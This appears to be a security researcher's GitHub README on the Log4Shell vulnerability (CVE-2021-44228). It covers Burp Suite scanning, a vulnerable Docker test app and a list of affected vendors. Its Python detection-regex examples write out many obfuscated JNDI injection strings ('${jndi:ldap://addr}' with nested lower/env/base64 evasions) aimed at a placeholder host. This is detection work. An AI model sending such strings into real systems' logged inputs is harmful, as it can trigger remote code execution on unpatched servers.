![](https://github.com/nu11secur1ty/CVE-mitre/blob/main/CVE-2021-44228/docs/Apache-Log4j-Logo-960x540.png)

## [Software](https://logging.apache.org/log4j/2.x/download.html)

- Explanation: [log4j](https://logging.apache.org/log4j/2.x/security.html)

- Collaboration: [burp-log4shell](https://github.com/silentsignal/burp-log4shell)

- - Thanks

## [More](https://businessinsights.bitdefender.com/technical-advisory-zero-day-critical-vulnerability-in-log4j2-exploited-in-the-wild)

## [CVE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228)

# Protect yourself, before you break yourself... ;)

## Description:

Apache Log4j2 2.0-beta9 through 2.12.1 and 2.13.0 through 2.15.0 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0, this functionality has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects.

## Usage and explanation:

- Demonstration of scanning for `Log4j` vulnerability

- - NOTE: For advanced users!

- Manual installing the extension for BurpSuite

[![](https://github.com/nu11secur1ty/CVE-mitre/blob/main/CVE-2021-44228/docs/Screenshot%202021-12-17%20140538.png)](https://portswigger.net/bappstore/b011be53649346dd87276bca41ce8e8f)

## IMPORTANT:

- Check in to BApp Store if all components are deployed!

![](https://github.com/nu11secur1ty/CVE-mitre/blob/main/CVE-2021-44228/docs/Screenshot%202021-12-17%20141456-important.png)

-----------------------------------------------------------

```python
>>> from log4shell_regexes import *

>>> t = lambda s: [k for k in test(s)]
>>> tt = lambda s: [(k, list(v.keys())) for k, v in test_thorough(s).items()]

>>> t('${ jndi\t: addr\n}')
['SIMPLE_RE', 'ANY_RE', 'ANY_INCL_ESCS_RE', 'SIMPLE_OPT_RCURLY_RE', 'ANY_OPT_RCURLY_RE', 'ANY_INCL_ESCS_OPT_RCURLY_RE']

>>> t('${ jndi\t: addr\n')
['SIMPLE_OPT_RCURLY_RE', 'ANY_OPT_RCURLY_RE', 'ANY_INCL_ESCS_OPT_RCURLY_RE']

>>> t('\044%7B\\44{env:NOTHING:-j}\u0024{lower:N}\\u0024{lower:${upper:d}}}i:addr}')
['SIMPLE_ESC_VALUE_RE', 'NESTED_RE', 'NESTED_INCL_ESCS_RE', 'ANY_RE', 'ANY_INCL_ESCS_RE', 'SIMPLE_ESC_VALUE_OPT_RCURLY_RE', 'NESTED_OPT_RCURLY_RE', 'NESTED_INCL_ESCS_OPT_RCURLY_RE', 'ANY_OPT_RCURLY_RE', 'ANY_INCL_ESCS_OPT_RCURLY_RE']

>>> t('${base64:d2hvIHRob3VnaHQgYW55IG9mIHRoaXMgd2FzIGEgZ29vZCBpZGVhPwo=}')
['ANY_RE', 'ANY_INCL_ESCS_RE', 'ANY_OPT_RCURLY_RE', 'ANY_INCL_ESCS_OPT_RCURLY_RE']

>>> t('%24%7Bjnd%24%7Bupper%3A%C4%B1%7D%3Aaddr%7D')
['NESTED_INCL_ESCS_RE', 'ANY_INCL_ESCS_RE', 'NESTED_INCL_ESCS_OPT_RCURLY_RE', 'ANY_INCL_ESCS_OPT_RCURLY_RE']

>>> t('$%7B\u006a\\156di:addr\\x7d')
['ANY_INCL_ESCS_RE', 'ANY_INCL_ESCS_OPT_RCURLY_RE']

>>> t('${jndi:${lower:l}${lower:d}a${lower:p}://$a{upper:d}dr}')
['SIMPLE_RE', 'NESTED_RE', 'NESTED_INCL_ESCS_RE', 'ANY_RE', 'ANY_INCL_ESCS_RE', 'SIMPLE_OPT_RCURLY_RE', 'NESTED_OPT_RCURLY_RE', 'NESTED_INCL_ESCS_OPT_RCURLY_RE', 'ANY_OPT_RCURLY_RE', 'ANY_INCL_ESCS_OPT_RCURLY_RE']

>>> t('${jndi:dns://addr}')
['SIMPLE_RE', 'ANY_RE', 'ANY_INCL_ESCS_RE', 'SIMPLE_OPT_RCURLY_RE', 'ANY_OPT_RCURLY_RE', 'ANY_INCL_ESCS_OPT_RCURLY_RE']

>>> t('${${base64:am5kaTpsZGFwOi8vYWRkcgo=}}') # LOG4J2-2446
['NESTED_RE', 'NESTED_INCL_ESCS_RE', 'ANY_RE', 'ANY_INCL_ESCS_RE', 'NESTED_OPT_RCURLY_RE', 'NESTED_INCL_ESCS_OPT_RCURLY_RE', 'ANY_OPT_RCURLY_RE', 'ANY_INCL_ESCS_OPT_RCURLY_RE']

>>> t('${jndi:${lower:l}${lower:d}a${lower:p}://addr')
['SIMPLE_RE', 'NESTED_RE', 'NESTED_INCL_ESCS_RE', 'ANY_RE', 'ANY_INCL_ESCS_RE', 'SIMPLE_OPT_RCURLY_RE', 'NESTED_OPT_RCURLY_RE', 'NESTED_INCL_ESCS_OPT_RCURLY_RE', 'ANY_OPT_RCURLY_RE', 'ANY_INCL_ESCS_OPT_RCURLY_RE']

>>> t('${${::-j}nd${upper:ı}:rm${upper:ı}://addr}')
['NESTED_RE', 'NESTED_INCL_ESCS_RE', 'ANY_RE', 'ANY_INCL_ESCS_RE', 'NESTED_OPT_RCURLY_RE', 'NESTED_INCL_ESCS_OPT_RCURLY_RE', 'ANY_OPT_RCURLY_RE', 'ANY_INCL_ESCS_OPT_RCURLY_RE']

>>> t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//addr}')
['NESTED_RE', 'NESTED_INCL_ESCS_RE', 'ANY_RE', 'ANY_INCL_ESCS_RE', 'NESTED_OPT_RCURLY_RE', 'NESTED_INCL_ESCS_OPT_RCURLY_RE', 'ANY_OPT_RCURLY_RE', 'ANY_INCL_ESCS_OPT_RCURLY_RE']

>>> t('%5Cu002524%257Bjnd%2524%257Bupper%255Cu003a%255C%255C461%257D%253Aldap%253A%5C0452F%252Faddr%257D')
[]

>>> tt('%5Cu002524%257Bjnd%2524%257Bupper%255Cu003a%255C%255C461%257D%253Aldap%253A%5C0452F%252Faddr%257D')
[
	(
		'\\u002524%7Bjnd%24%7Bupper%5Cu003a%5C%5C461%7D%3Aldap%3A\\0452F%2Faddr%7D',
		['NESTED_INCL_ESCS_RE', 'ANY_INCL_ESCS_RE', 'NESTED_INCL_ESCS_OPT_RCURLY_RE', 'ANY_INCL_ESCS_OPT_RCURLY_RE']
	), (
		'${jnd${upper\\u003a\\\\461}:ldap://addr}',
		['SIMPLE_ESC_VALUE_RE', 'NESTED_RE', 'NESTED_INCL_ESCS_RE', 'ANY_RE', 'ANY_INCL_ESCS_RE', 'SIMPLE_ESC_VALUE_OPT_RCURLY_RE', 'NESTED_OPT_RCURLY_RE', 'NESTED_INCL_ESCS_OPT_RCURLY_RE', 'ANY_OPT_RCURLY_RE', 'ANY_INCL_ESCS_OPT_RCURLY_RE']
	), (
		'${jnd${upper:\\461}:ldap://addr}',
		['SIMPLE_ESC_VALUE_RE', 'NESTED_RE', 'NESTED_INCL_ESCS_RE', 'ANY_RE', 'ANY_INCL_ESCS_RE', 'SIMPLE_ESC_VALUE_OPT_RCURLY_RE', 'NESTED_OPT_RCURLY_RE', 'NESTED_INCL_ESCS_OPT_RCURLY_RE', 'ANY_OPT_RCURLY_RE', 'ANY_INCL_ESCS_OPT_RCURLY_RE']
	), (
		'${jnd${upper:ı}:ldap://addr}',
		['NESTED_RE', 'NESTED_INCL_ESCS_RE', 'ANY_RE', 'ANY_INCL_ESCS_RE', 'NESTED_OPT_RCURLY_RE', 'NESTED_INCL_ESCS_OPT_RCURLY_RE', 'ANY_OPT_RCURLY_RE', 'ANY_INCL_ESCS_OPT_RCURLY_RE']
	)
]
```

## Docker vulnerable app:

```docker
cd vuln_app/CVE-2021-44228-VULN-APP/
docker build -t log4j-shell-poc .
docker run --network host log4j-shell-poc
```
- Listening on port `8080`

 ## Support for vulnerable machine APP by 
 
 
 - `kozmer`


## Support for Burp module by


- `silentsignal`


## Demo, testing, and debugging by


- `nu11secur1ty`


## Video and reproduce of the vulnerability 

- NOTE: The test is outside of the credentials for login! ;)

[href](https://streamable.com/z1qkax)

-------------------------------------------------------------------------------------------------------------

Log4j impact on manufacturers and components summary from the Internet community. If Manufacturer or Component is not verified, it does not have screenshots or references to prove that it is affected.

## The List

| Manufacturer/Component                   | Notes | Verified |
| ---------------------------------------- | ----- | -------- |
| [Apple](Log4jAttackSurface/pages/apple.md)                  |       | TRUE     |
| [Tencent](Log4jAttackSurface/pages/Tencent.md)              |       | TRUE     |
| [Steam](Log4jAttackSurface/pages/Steam.md)                  |       | TRUE     |
| [Twitter](Log4jAttackSurface/pages/Twitter.md)              |       | TRUE     |
| [Baidu](Log4jAttackSurface/pages/Baidu.md)                  |       | TRUE     |
| [DIDI](Log4jAttackSurface/pages/DIDI.md)                    |       | TRUE     |
| [JD](Log4jAttackSurface/pages/JD.md)                        |       | TRUE     |
| [NetEase](Log4jAttackSurface/pages/NetEase.md)              |       | TRUE     |
| [CloudFlare](Log4jAttackSurface/pages/CloudFlare.md)        |       | TRUE     |
| [Amazon](Log4jAttackSurface/pages/Amazon.md)                |       | TRUE     |
| [Tesla](vpages/Tesla.md)                  |       | TRUE     |
| [Apache Solr](Log4jAttackSurface/pages/ApacheSolr.md)       |       | TRUE     |
| [Apache Druid](Log4jAttackSurface/pages/ApacheDruid.md)     |       | TRUE     |
| [Apache Flink](Log4jAttackSurface/pages/ApacheFlink.md)     |       | FALSE    |
| [Apache Struts2](Log4jAttackSurface/pages/ApacheStruts2.md) |       | TRUE     |
| [flume](Log4jAttackSurface/pages/flume.md)                  |       | FALSE    |
| [dubbo](Log4jAttackSurface/pages/dubbo.md)                  |       | FALSE    |
| [IBM Qradar SIEM](Log4jAttackSurface/pages/IBM.md)          |       | TRUE     |
| [PaloAlto Panorama](Log4jAttackSurface/pages/PaloAlto.md)   |       | TRUE     |
| [Redis](Log4jAttackSurface/pages/Redis.md)                  |       | FALSE    |
| [logstash](Log4jAttackSurface/pages/logstash.md)            |       | FALSE    |
| [ElasticSearch](Log4jAttackSurface/pages/ElasticSearch.md)  |       | TRUE     |
| [kafka](Log4jAttackSurface/pages/kafka.md)                  |       | FALSE    |
| [ghidra](Log4jAttackSurface/pages/ghidra.md)                |       | TRUE     |
| [ghidra server](Log4jAttackSurface/pages/ghidraServer.md)   |       | TRUE     |
| [Minecraft](Log4jAttackSurface/pages/Minecraft.md)          |       | TRUE     |
| [PulseSecure](Log4jAttackSurface/pages/PulseSecure.md)      |       | TRUE     |
| [UniFi](Log4jAttackSurface/pages/UniFi.md)                  |       | TRUE     |
| [VMWare](Log4jAttackSurface/pages/VMWare.md)                |       | TRUE     |
| [Blender](Log4jAttackSurface/pages/Blender.md)              |       | TRUE     |
| [Google](Log4jAttackSurface/pages/Google.md)                  |       | TRUE     |
| [Webex](Log4jAttackSurface/pages/Webex.md)                  |       | TRUE     |
| [LinkedIn](Log4jAttackSurface/pages/LinkedIn.md)                  |       | TRUE     |
| [VMWarevCenter](Log4jAttackSurface/pages/VMWarevCenter.md)                  |       | TRUE     |
| [Speed camera LOL](Log4jAttackSurface/pages/SpeedCamera.md)                  |       | TRUE     |

## [More](https://github.com/YfryTchsGD/Log4jAttackSurface)


## [Information](https://logging.apache.org/log4j/2.x/)

## [Scanner](https://github.com/fullhunt/log4j-scan)
